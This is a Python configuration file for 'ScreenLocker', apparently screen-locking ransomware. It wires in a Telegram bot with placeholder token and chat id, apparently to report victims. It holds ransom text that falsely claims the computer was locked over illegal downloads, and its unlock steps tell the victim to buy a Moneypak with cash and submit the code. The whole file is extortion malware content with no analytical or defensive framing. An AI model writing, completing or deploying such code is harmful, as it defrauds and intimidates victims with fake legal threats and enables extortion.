from uuid import uuid4
from TelegramBot import TelegramBot

class Config:
    def __init__(self):
        self.api = TelegramBot('token')
        self.chat_id = 1234
        self.uid = str(uuid4())
        self.Window_title = 'ScreenLocker'
        self.title = 'WINDOWS LOCKED BY ScreenLocker'
        self.lock_text = "Your computer has been locked!"
        self.attempts_remaining = 3
        self.unlock_instructions = '''Your computer has been locked due to
suspicion of illegal content download and
distribution.
Nothing to worry, the files are not encrypted
you are blocked from accessing your\ncomputer'''
        self.unlock_procedure = 'How to unlock your computer'
        self.unlock_steps = '''1. Take your cash to one of the stores.
2. Get a Moneypak and purchase it with cash at the register
3. Come back and enter your Moneypak code.'''
